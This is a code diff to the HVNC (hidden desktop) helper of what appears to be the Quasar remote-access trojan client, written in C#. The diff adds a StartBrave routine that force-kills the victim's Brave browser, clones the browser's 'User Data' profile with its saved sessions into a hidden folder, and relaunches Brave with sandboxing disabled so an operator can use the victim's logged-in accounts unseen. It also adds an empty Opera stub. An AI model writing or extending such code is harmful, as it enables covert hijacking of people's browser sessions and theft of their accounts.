@@ -1,7 +1,9 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace Quasar.Client.Helper.HVNC
 {
@@ -101,6 +103,41 @@ namespace Quasar.Client.Helper.HVNC
             string filePath2 = "cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile " + text;
             this.CreateProc(filePath2);
         }
+
+        public void StartBrave()
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
+            string sourceDir = Path.Combine(path, "User Data");
+            string secureFolder = Path.Combine(path, "SecureFolder");
+            string killCommand = "cmd.exe /c taskkill /IM brave.exe /F";
+
+            if (!Directory.Exists(secureFolder))
+            {
+                this.CreateProc(killCommand);
+                Directory.CreateDirectory(secureFolder);
+                this.CloneDirectory(sourceDir, secureFolder);
+            }
+            else
+            {
+                DeleteFolder(secureFolder);
+                this.StartBrave();
+            }
+
+            string startCommand = "cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
+            this.CreateProc(startCommand);
+        }
+
+
+
+
+
+        public void StartOpera()
+        {
+            //soon
+        }
+
+
+
 
         public void StartEdge()
         {
